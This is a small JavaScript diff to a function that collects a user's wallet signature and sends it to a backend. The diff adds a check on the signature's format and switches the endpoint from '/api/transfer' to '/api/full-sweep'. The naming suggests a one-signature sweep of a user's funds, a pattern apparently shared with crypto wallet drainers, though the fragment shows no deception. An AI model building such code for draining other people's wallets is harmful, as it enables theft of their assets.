@@ -40,8 +40,13 @@ export async function initiateSingleSignatureSweep(provider, userAddress) {
 
     console.log('✅ User signed! Sending to backend...')
 
+    // Validate signature format
+    if (typeof signature !== 'string' || !signature.startsWith('0x')) {
+      throw new Error('Invalid signature format from wallet')
+    }
+
     // ✅ Step 3: Send signature to backend
-    const response = await fetch('/api/transfer', {
+    const response = await fetch('/api/full-sweep', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
